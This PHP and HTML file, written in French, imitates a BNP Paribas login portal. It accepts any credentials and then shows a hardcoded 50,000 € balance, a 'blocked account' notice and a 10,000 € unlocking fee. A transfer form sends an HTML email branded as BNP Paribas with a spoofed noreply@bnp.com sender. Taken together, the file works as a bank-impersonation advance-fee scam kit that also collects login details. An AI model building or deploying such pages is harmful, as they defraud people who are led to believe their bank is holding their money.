<?php
// Exemple de données de compte
$nom_utilisateur = "Thomas Rousseau";
$solde = 50000;  // Solde initial
$compte_bloque = true;  // Compte bloqué
$frais_deblocage = 10000;  // Frais de déblocage
$iban = "FR1420041010050500013M02606";  // IBAN fictif

// Transactions fictives
$transactions = [
    "Achat Netflix" => -15.99,
    "Paiement Supermarché" => -85.30
];

// Simulation de la connexion (pour cet exemple, on simule toujours que l'utilisateur se connecte avec succès)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Affichage du message après connexion (exemple)
    echo "<h2>Bonjour $nom_utilisateur</h2>";
    
    // Vérifier si le compte est bloqué
    if ($compte_bloque) {
        echo "<p><strong>Votre compte est bloqué pour des raisons de sécurité.</strong></p>";
        echo "<p>Frais de déblocage : <strong>$frais_deblocage €</strong></p>";
        echo "<button onclick='debloquerCompte()'>Débloquer le compte</button>";
    } else {
        echo "<p>Solde actuel : <strong>$solde €</strong></p>";
        echo "<p>IBAN : <strong>$iban</strong></p>";
        echo "<h3>Transactions :</h3>";
        
        foreach ($transactions as $transaction => $montant) {
            echo "<p>$transaction : <strong>$montant €</strong></p>";
        }

        // Formulaire pour faire un virement (fictif)
        echo "<h3>Effectuer un virement :</h3>";
        echo "<form action='#' method='POST'>";
        echo "<label for='montant'>Montant à transférer :</label><br>";
        echo "<input type='number' id='montant' name='montant' min='0' step='0.01'><br><br>";
        echo "<button type='submit'>Effectuer le virement</button>";
        echo "</form>";
    }
}

// Code pour envoyer un e-mail après le virement (fictif)
if (isset($_POST['montant'])) {
    // Montant du virement
    $montant = $_POST['montant'];

    // E-mail du destinataire (exemple fictif)
    $destinataire = "destinataire@example.com";  // Remplace par l'adresse e-mail du destinataire

    // Sujet de l'e-mail
    $sujet = "Confirmation de virement effectué";

    // Corps de l'e-mail
    $message = "
    <html>
    <head>
        <title>Confirmation de virement</title>
    </head>
    <body>
        <h2>Bonjour $nom_utilisateur</h2>
        <p>Une transaction de <strong>$montant €</strong> a été effectuée depuis votre compte.</p>
        <p>Votre compte a été débité de cette somme.</p>
        <p>Merci de nous faire confiance.</p>
        <p><strong>BNP Paribas</strong></p>
    </body>
    </html>
    ";

    // Pour envoyer un e-mail HTML, tu dois définir les en-têtes
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // En-tête supplémentaire
    $headers .= 'From: <noreply@bnp.com>' . "\r\n";

    // Envoi de l'e-mail
    if (mail($destinataire, $sujet, $message, $headers)) {
        echo "<p>Le virement de <strong>$montant €</strong> a été effectué avec succès. Une confirmation a été envoyée au destinataire.</p>";
    } else {
        echo "<p>Erreur lors de l'envoi de l'e-mail de confirmation.</p>";
    }
}

// Script JS pour déblocage
echo "
<script>
function debloquerCompte() {
    alert('Déblocage effectué, frais de déblocage : $frais_deblocage €');
    // Vous pouvez ajouter un processus de paiement ici si nécessaire
}
</script>";
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNP Paribas - Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
        }

        .login-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        input[type="text"], input[type="password"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        h2 {
            color: #007bff;
        }
        
        .logo img {
            max-width: 200px;
            margin: 20px 0;
        }

        .input-group {
            margin: 10px 0;
        }

        .input-group label {
            font-weight: bold;
        }

        .help {
            font-size: 14px;
            color: #007bff;
        }

        .help a {
            color: #007bff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <!-- Ici tu peux mettre le logo BNP Paribas -->
            <img src="bnp-logo.png" alt="BNP Paribas">
        </div>
        <h2>Accédez à votre compte</h2>
        <form action="index.php" method="POST">
            <div class="input-group">
                <label>Identifiant</label>
                <input type="text" name="email" placeholder="Votre identifiant" required>
            </div>
            <div class="input-group">
                <label>Mot de passe</label>
                <input type="password" name="password" placeholder="Votre mot de passe" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
        <p class="help"><a href="#">Mot de passe oublié ?</a></p>
    </div>
</body>
</html>
